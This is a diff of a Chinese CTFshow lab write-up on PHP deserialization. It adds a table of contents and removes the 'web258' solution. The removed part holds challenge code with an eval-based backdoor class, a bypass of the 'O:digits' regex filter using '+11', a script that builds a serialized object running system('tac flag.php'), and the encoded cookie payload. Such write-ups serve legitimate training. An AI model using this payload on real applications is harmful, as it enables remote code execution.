@@ -2,6 +2,8 @@
 {"dg-publish":true,"dg-path":"安全/靶场/CTFshow_反序列化1.md","permalink":"/安全/靶场/CTFshow_反序列化1/","title":"CTFshow_反序列化1"}
 ---
 
+```table-of-contents
+```
 # web254
 ```php
 <?php  
@@ -283,99 +285,6 @@ user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%2
 
 得到flag
 ![Pasted image 20241007214350.png](/img/user/picture/Pasted%20image%2020241007214350.png)
-
-
-
-
-
-# web258
-
-```php
-<?php    
-error_reporting(0);  
-highlight_file(__FILE__);  
-  
-class ctfShowUser{  
-    public $username='xxxxxx';  
-    public $password='xxxxxx';  
-    public $isVip=false;  
-    public $class = 'info';  
-  
-    public function __construct(){        
-    $this->class=new info();  
-    }  
-    public function login($u,$p){  
-        return $this->username===$u&&$this->password===$p;  
-    }  
-    public function __destruct(){        
-    $this->class->getInfo();  
-    }  
-  
-}  
-  
-class info{  
-    public $user='xxxxxx';  
-    public function getInfo(){  
-        return $this->user;  
-    }  
-}  
-  
-class backDoor{  
-    public $code;  
-    public function getInfo(){  
-        eval($this->code);  
-    }  
-}  
-  
-$username=$_GET['username'];  
-$password=$_GET['password'];  
-  
-if(isset($username) && isset($password)){  
-    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){        $user = unserialize($_COOKIE['user']);  
-    }    $user->login($username,$password);  
-}
-```
-
-这一题加了限制条件，也就是不能出现`o或者c:数字:`这种组合，所以我们只需要将里面的数字加上符号就可以了，比如里面出现的11修改成+11
-
-```php
-<?php  
-class ctfShowUser{  
-    public $class = 'info';  
-  
-    public function __construct(){  
-        $this->class=new backDoor();  
-    }  
-  
-  
-}  
-  
-class backDoor{  
-    public $code='system("tac flag.php");';  
-  
-}  
-  
-  
-$a=serialize(new ctfShowUser())."<br>";  
-$b=str_replace(':11',':+11',$a);  
-$c=str_replace(':8',':+8',$b);  
-  
-if(!preg_match('/[oc]:\d+:/i', $c)){  
-    echo "user=".urlencode($c);  
-}  
-  
-?>
-```
-
-得到payload：
-```txt
-user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D%3Cbr%3E
-```
-
-拿到flag：
-![Pasted image 20241007222435.png](/img/user/picture/Pasted%20image%2020241007222435.png)
-
-
 
 
 
